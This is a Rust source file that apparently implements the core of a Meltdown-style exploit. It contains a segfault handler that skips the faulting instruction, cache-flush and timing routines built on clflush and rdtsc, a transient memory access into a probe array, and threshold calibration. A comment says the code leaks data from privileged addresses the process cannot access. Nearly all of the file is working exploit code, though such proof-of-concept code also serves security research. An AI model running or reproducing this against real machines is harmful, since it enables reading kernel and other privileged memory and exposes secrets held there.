use crate::*;

#[cfg(feature = "handle-sigsegv")]
pub(crate) extern "C" fn handle_sigsegv(
    _signal: libc::c_int,
    _info: *mut libc::siginfo_t,
    arg: *mut libc::c_void,
) {
    let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
    // very verbose, only uncomment if you want to see that you're leaking data from privileged
    // addresses that you cannot access
    /*
    use std::convert::TryFrom;
    let offending_address =
        unsafe { (*_info)._pad[1] as usize | (((*_info)._pad[2] as usize) << 32) };
    println!(
        "Got {:?} with offending_addres 0x{:x}, ignoring",
        Signal::try_from(_signal).unwrap(),
        offending_address
    );
    */
    // overwrite RIP to jump to our trampoline (REG_RIP = 16)
    // 15 is the width needed to encode the instructions in release mode,
    // let's set it to 25 and be done with it!
    context.uc_mcontext.gregs[16] += 25;
}

#[inline(always)]
pub(crate) fn flush_measurement_area() {
    unsafe {
        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
            core::arch::x86_64::_mm_clflush(
                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
            );
        }
    }
}

#[inline(always)]
pub(crate) fn measure_time_to_read(address: usize) -> u64 {
    let delta_tsc;
    unsafe {
        asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
             "movzx r9, byte ptr [{0}]",
             "mfence", "lfence",  "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
             in(reg) address,
             out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
    }

    delta_tsc
}

#[inline(always)]
pub(crate) fn measure_byte<M: Method>() -> Option<u8> {
    unsafe {
        let nb_cycles_threshold = MIN_NB_CYCLES + M::NB_CYCLES_OFFSET;
        for i in 0..256 {
            let count_addr = BASE_ADDR as usize + i as usize * MULTIPLE_OFFSET;
            LATENCIES[i as usize] = measure_time_to_read(count_addr);
        }

        LATENCIES
            .iter()
            .enumerate()
            .min_by(|(_, x), (_, y)| x.cmp(y))
            // the access should take less than THRESHOLD CPU cycles
            .filter(|(_, &x)| x < nb_cycles_threshold)
            .map(|(x, _)| x as u8)
    }
}

#[inline(always)]
pub(crate) unsafe fn access_memory(target_adress: usize) {
    asm!(
        "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rax, byte ptr [rax]",
         // nop sled for the signal handler to skip the access upon segfault
         "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
         in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rbx") _, out("rax") _);
}

#[inline(always)]
pub(crate) fn repeat_move_for_training_meltdown() {
    unsafe {
        let train_addr = &TEST_ARR[0] as *const u8 as usize;

        for _ in 0..392 {
            asm!(
                "mov rax, rcx", "movzx rax, byte ptr [rax]",
                in("rcx") train_addr, out("rax") _);
        }
    }
}

pub(crate) fn setup_measurements() {
    unsafe {
        let base_addr = TEST_ARR.as_ptr() as usize;
        // align on a cache line size
        BASE_ADDR =
            (base_addr + 4096 + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);

        // prefetch
        for i in 0..TEST_ARR.len() {
            TEST_ARR[i] = 127;
        }

        core::ptr::read_volatile(BASE_ADDR as *const u8);
        let mut read_cached_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            read_cached_time += measure_time_to_read(BASE_ADDR);
        }
        read_cached_time /= NB_CYCLES_TRAIN;

        let mut read_flushed_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            core::arch::x86_64::_mm_clflush(BASE_ADDR as *mut u8);
            read_flushed_time += measure_time_to_read(BASE_ADDR);
        }
        read_flushed_time /= NB_CYCLES_TRAIN;

        MIN_NB_CYCLES = core::cmp::min(
            200,
            core::cmp::max(
                140,
                read_cached_time + (read_flushed_time - read_cached_time) / 2,
            ),
        );

        println!(
            "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
            read_cached_time, read_flushed_time, MIN_NB_CYCLES
        );
    };
}
